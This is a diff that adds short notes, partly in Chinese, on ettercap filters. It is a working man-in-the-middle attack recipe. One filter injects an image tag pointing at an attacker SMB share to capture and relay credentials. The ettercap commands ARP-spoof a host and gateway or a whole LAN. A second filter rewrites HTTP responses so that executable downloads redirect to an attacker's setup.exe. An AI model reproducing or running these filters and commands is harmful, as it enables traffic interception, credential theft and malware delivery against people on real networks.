@@ -1,0 +1,51 @@
+ettercap filter:
+
+man 8 etterfilter
+if 和 ( 之间必须有空格，每个if 语句必须 {}.
+
+smbrelay.filter:
+-----------------------------------------------------------------------------
+if (ip.proto == TCP && tcp.dst == 80) {
+    if (search(DATA.data, "Accept-Encoding")) {
+        replace("Accept-Encoding", "Accept-Mousecat");
+        msg("Zapped Accept-Encoding OK!\n");
+    }
+}
+
+if (ip.proto == TCP && tcp.src == 80) {
+    replace("</body>", "<img src=\"\\\\192.168.0.10\\img.jpg\" </body>");
+    replace("</Body>", "<img src=\"\\\\192.168.0.10\\img.jpg\" </Body>");
+    msg("Filter Ran!\n");
+}
+-----------------------------------------------------------------------------
+
+etterfilter smbrelay.filter -o smbrelay.ef
+
+ettercap -T -q -F smbrelay.ef -M arp /host/ /gateway/
+or
+ettercap -T -q -F smbrelay.ef -M arp // //
+
+
+替换.exe文件:
+-----------------------------------------------------------------------------
+if (ip.proto == TCP && tcp.dst == 80) {
+    if (search(DATA.data, "Accept-Encoding")) {
+        replace("Accept-Encoding", "Accept-Mousecat");
+        msg("Zapped Encoding OK!\n");
+    }
+}
+
+if (ip.proto == TCP && tcp.src == 80) {
+    replace("keep-alive", "close");
+    replace("Keep-Alive", "close");
+}
+
+if (ip.proto == TCP && search(DATA.data, ": application")) {
+    msg("Found EXE\n");
+    if (search(DATA.data, "Win32")) {
+        msg("Doing nothing!\n");
+    } else {
+        replace("200 Ok", "301 Moved Permamently Location: http://....../setup.exe");
+        msg("Ok!\n");
+    }
+}
